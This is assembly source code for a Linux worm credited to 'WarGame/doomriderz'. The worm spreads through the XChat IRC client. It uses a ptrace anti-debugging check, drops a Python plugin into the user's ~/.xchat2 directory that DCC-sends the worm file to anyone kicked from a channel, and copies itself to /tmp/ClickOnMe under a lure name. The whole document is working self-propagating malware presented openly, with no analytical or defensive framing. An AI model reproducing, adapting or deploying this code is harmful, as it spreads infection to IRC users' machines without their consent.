   ; This is the first worm that uses the xchat program to spread.
   ; It works as following:
   ; 1) chdir() to HOME directory
   ; 2) chdir() to .xchat2 directory, it exists if the dir doesn't exist
   ; 3) Drop the xchat2worm.py script
   ; 4) Drop the worm in /tmp
   ;                               coded by [WarGame/doomriderz]
   ; P.S: If you invoke it as ./xchat2worm it will not work properly coz of "./"
   ; but a normal user will simply click on it (so argv[0] -> /somepath/xchat2worm)
   ; Thx go to SlageHammer and emp_ for their help with stack :)

   BITS 32
   global main
   extern getenv ; hehe from libc :)
   extern system
   extern sprintf


   section .data
   ;;; the python irc script ;;;
   python_irc:
   db '__module_name__ = "xchat2worm"',13,10
   db '__module_version__ = "0.1"',13,10
   db '__module_description__ = "xchat2worm by [WarGame/doomriderz]"',13,10
   db 'import xchat',13,10
   db 'def onkick_cb(word, word_eol, userdata):',13,10
   db '    if xchat.nickcmp(word[3],xchat.get_info("nick")) != 0:',13,10
   db '        xchat.command("DCC SEND " + word[3] + " /tmp/ClickOnMe")',13,10
   db '    return xchat.EAT_NONE ',13,10
   db 'xchat.hook_server("KICK", onkick_cb)',0
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   irc_len equ ($-python_irc)
   script_name db "xchat2worm.py",0
   home_env db "HOME",0
   xchat2_dir db ".xchat2",0
   fmt db "cp %s /tmp/ClickOnMe",0
   cp_cmd: TIMES 260 db 0

   section .text
   main:
        GetPath:
              pop eax
              pop ebx
              pop ebx
              push dword [ebx]
              push fmt
              push cp_cmd
              call sprintf ; this code should build "cp my_path /tmp/drop0"
        AntiDebug:
              mov eax,26  ; ptrace()
              xor ebx,ebx
              xor ecx,ecx
          xor edx,edx
              inc edx
          xor esi,esi
          int 0x80
          test eax,eax
              jne near ExiT
         GetHome:
              push home_env
              call getenv
              cmp eax,0
              je NoDir
        GoHome:
              xchg ebx,eax
              mov eax,12
              int 80h
        GoXchat2Dir:
              mov eax,12
              mov ebx,xchat2_dir
              int 80h
              cmp eax,-1
              jne DropPythonScript
        NoDir:
              mov eax,1
              mov ebx,0
              int 80h
        DropPythonScript:
              mov eax,8
              mov ebx,script_name
              mov ecx,00644Q
              int 80h
              xchg ebx,eax
              mov eax,4
              mov ecx,python_irc
              mov edx,irc_len
              int 80h
        DropWorm:
              push cp_cmd
              call system
         ExiT:
              mov eax,1
              mov ebx,0
              int 80h
